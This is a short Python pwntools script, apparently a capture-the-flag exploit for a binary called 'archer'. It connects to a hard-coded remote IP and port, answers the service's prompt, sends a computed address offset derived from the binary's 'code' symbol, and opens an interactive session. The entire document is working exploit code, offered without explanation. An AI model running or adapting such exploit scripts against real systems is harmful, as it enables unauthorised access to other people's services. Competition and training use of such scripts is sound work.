from pwn import *

e = ELF('archer')
io = remote('193.57.159.27', 23258)

io.recvuntil(': ')
io.sendline('yes')
io.recvuntil('?\n')
h = str(hex(e.symbols['code']-0x500000)).replace('0x','')
io.sendline(h)
io.interactive()
